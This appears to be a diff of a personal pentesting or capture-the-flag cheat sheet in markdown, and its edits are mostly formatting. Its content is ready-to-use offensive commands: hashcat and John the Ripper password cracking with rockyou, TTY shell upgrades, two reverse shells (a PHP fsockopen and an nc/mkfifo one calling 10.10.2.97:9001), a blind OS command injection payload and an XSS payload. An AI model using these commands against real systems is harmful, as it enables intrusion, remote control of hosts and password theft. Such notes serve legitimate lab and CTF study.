@@ -1,18 +1,23 @@
 # Hashcat
+
 - hashcat -m 1800 -a 0 hash.txt rockyou.txt
 
 # Find command
-- find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2>/dev/null
 
+```sh
+find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2>/dev/null
+```
 # Upgrading to a shell
-- python -c 'import pty;pty.spawn('/bin/bash')'
-- SHELL=/bin/bash script -q /dev/null
-
+```sh
+python -c 'import pty;pty.spawn('/bin/bash')'
+SHELL=/bin/bash script -q /dev/null
+```
 # Reverse Shell
 - php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 - m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
 
 # Blind OS injection
+
 ```sh
 
 ||whoami>/var/www/images/output.txt||
@@ -29,7 +34,7 @@
 ```
 # XSS payloads
 
-```js
+```html
 <script>onclick(alert("Hello"));</script>
 // window.location.hostname
 
@@ -39,7 +44,7 @@
 
 ```sh
 
-- john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
 ```
 
 # Encryption gpg
@@ -53,8 +58,9 @@
 - gpg2john [encrypted gpg file] > [filename of the hash you want to create]
 
 # Reverse a wordlist
-- $ tac data.txt > new_data.txt
-
+```sh
+tac data.txt > new_data.txt
+```
 # Email re
 -   email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)')
 
